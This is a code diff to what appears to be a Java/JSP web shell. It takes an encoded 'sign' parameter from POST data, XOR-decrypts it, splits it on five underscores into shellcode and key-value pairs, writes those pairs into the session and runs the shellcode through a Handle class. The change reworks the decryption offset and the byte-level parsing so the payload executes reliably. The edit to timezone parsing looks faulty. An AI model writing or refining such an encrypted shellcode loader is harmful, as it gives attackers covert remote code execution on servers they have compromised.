@@ -47,8 +47,8 @@
         // Extract timezone
         int timezoneStart = postData.indexOf("\"timezone\":");
         if (timezoneStart != -1) {
-          int valueStart = postData.indexOf("\"", timezoneStart + 11) + 1;
-          int valueEnd = postData.indexOf("\"", valueStart);
+          int valueStart = postData.indexOf(":") + 1;
+          int valueEnd = postData.indexOf(",");
           if (valueStart > 0 && valueEnd > valueStart) {
             timezone = postData.substring(valueStart, valueEnd);
           }
@@ -93,43 +93,62 @@
           // XOR decryption
           byte[] keyBytes = key.getBytes("UTF-8");
           for (int i = 0; i < decodedSign.length; i++) {
-            decodedSign[i] = (byte)(decodedSign[i] ^ keyBytes[(i + 5) & 15]);
+            decodedSign[i] = (byte)(decodedSign[i] ^ keyBytes[(i + 1) & 15]);
           }
 
-          // Convert decrypted bytes to string
-          String decryptedContent = new String(decodedSign, "UTF-8");
+          // Find the last occurrence of 5 consecutive underscore bytes (0x5F)
+          int separatorIndex = -1;
+          byte underscoreByte = (byte)0x5F; // ASCII value of '_'
 
-          // Find the first underscore after shellcode
-          int underscoreIndex = decryptedContent.indexOf("_____");
-          if (underscoreIndex != -1) {
-            // Split into shellcode and parameters
-            String shellcodePart = decryptedContent.substring(0, underscoreIndex);
-            String paramsPart = decryptedContent.substring(underscoreIndex + 5);
+          // Search from the end backwards for 5 consecutive underscores
+          for (int i = decodedSign.length - 5; i >= 0; i--) {
+            boolean found = true;
+            for (int j = 0; j < 5; j++) {
+              if (decodedSign[i + j] != underscoreByte) {
+                found = false;
+                break;
+              }
+            }
+            if (found) {
+              separatorIndex = i;
+              break;
+            }
+          }
 
-            // Parse parameters (key1-value1,key2-value2,... format)
-            if (paramsPart != null && !paramsPart.isEmpty()) {
-              String[] pairs = paramsPart.split(",");
-              for (String pair : pairs) {
-                pair = pair.trim();
-                if (pair.contains("-")) {
-                  int dashIndex = pair.indexOf("-");
-                  String paramKey = pair.substring(0, dashIndex).trim();
-                  String paramValue = pair.substring(dashIndex + 1).trim();
-                  if (!paramKey.isEmpty()) {
-                    // Store in session
-                    session.setAttribute(paramKey, paramValue);
+          if (separatorIndex != -1) {
+            // Split into shellcode bytes and parameters
+            byte[] shellcodeBytes = new byte[separatorIndex];
+            System.arraycopy(decodedSign, 0, shellcodeBytes, 0, separatorIndex);
+
+            // Extract parameters part as string (after the 5 underscores)
+            int paramsStart = separatorIndex + 5;
+            if (paramsStart < decodedSign.length) {
+              byte[] paramsBytes = new byte[decodedSign.length - paramsStart];
+              System.arraycopy(decodedSign, paramsStart, paramsBytes, 0, paramsBytes.length);
+              String paramsPart = new String(paramsBytes, "UTF-8");
+
+              // Parse parameters (key1-value1,key2-value2,... format)
+              if (paramsPart != null && !paramsPart.isEmpty()) {
+                String[] pairs = paramsPart.split(",");
+                for (String pair : pairs) {
+                  pair = pair.trim();
+                  if (pair.contains("-")) {
+                    int dashIndex = pair.indexOf("-");
+                    String paramKey = pair.substring(0, dashIndex).trim();
+                    String paramValue = pair.substring(dashIndex + 1).trim();
+                    if (!paramKey.isEmpty()) {
+                      // registered needed params in session
+                      session.setAttribute(paramKey, paramValue);
+                    }
                   }
                 }
               }
             }
 
-            // Convert shellcode back to bytes for execution
-            byte[] shellcodeBytes = shellcodePart.getBytes("UTF-8");
-
-            // Execute the shellcode
+            // Execute the shellcode with original bytes
             new Handle(shellcodeBytes, pageContext);
           } else {
-            // If no underscore found, treat as original shellcode
+            // If no separator found, treat entire payload as shellcode
             new Handle(decodedSign, pageContext);
           }
         }
